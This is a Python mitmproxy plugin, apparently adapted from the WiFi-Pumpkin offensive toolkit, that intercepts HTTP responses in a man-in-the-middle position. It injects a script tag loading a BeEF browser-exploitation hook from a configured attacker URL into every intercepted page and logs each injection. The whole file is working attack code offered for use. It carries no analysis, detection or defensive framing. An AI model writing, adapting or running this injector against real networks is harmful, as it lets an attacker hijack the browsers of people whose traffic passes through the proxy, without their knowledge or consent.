"""
This module is an adapted copy of Wifi-Pumpkin's beef.py plugin developped by Marcos Nesster
https://github.com/P0cL4bs/WiFi-Pumpkin/blob/master/plugins/extension/beef.py

The adaptation is necessary because Wifi-Pumpkin uses a very 
outdated version of mitmproxy which still supported direct scripting.
"""

from bs4 import BeautifulSoup
from mitmproxy import ctx
from mitmproxy.models import decoded
from mitmplugin import MITMPlugin

class BeefInjector(MITMPlugin):

	def __init__(self):
		super(BeefInjector, self).__init__("beefinjector")

	def response(self, flow):
		with decoded(flow.response):  # Remove content encoding (gzip, ...)
			html = BeautifulSoup(flow.response.content)
			if html.body:
				script = html.new_tag(
					'script',
					src=self.config["beef_url"])
				html.body.insert(0, script)
				flow.response.content = str(html)
				ctx.log.info("[{}] Injected BeFF url hook in page '{}'...".format(self.name, flow.request.url))

def start():
	return BeefInjector()